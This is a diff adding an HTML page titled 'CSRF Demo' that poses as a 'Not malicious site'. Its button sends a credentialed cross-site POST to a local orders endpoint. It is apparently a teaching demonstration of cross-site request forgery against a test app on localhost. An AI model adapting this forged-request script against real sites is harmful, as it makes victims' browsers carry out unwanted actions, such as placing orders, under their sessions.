@@ -1,0 +1,37 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>CSRF Demo</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
+  </head>
+  <body class="m-3">
+    <h1>Not malicious site</h1>
+    <h4>Press the button!</h4>
+	<form class="row g-3" action="#">
+	  <div class="col-auto">
+			<button type="submit" class="btn btn-primary mb-3" id="attack">Here</button>
+	  </div>
+	</form>
+	<script src="https://code.jquery.com/jquery-3.7.0.min.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz" crossorigin="anonymous"></script>
+    <script>
+    	$("#attack").on("click", (evt) => {
+    		evt.preventDefault();
+    		fetch("http://localhost:8080/v1/orders/create", {
+    			method: "POST",
+    			credentials: "include",
+    			headers: {
+    				"Content-Type": "application/json"
+    			},
+    			body: JSON.stringify({
+    				productId: 1
+    			})
+    		}).then(res => res.data).then(data => {
+    			console.log(data);
+    		}).catch(err => console.log(err));
+    	});
+    </script>
+  </body>
+</html>
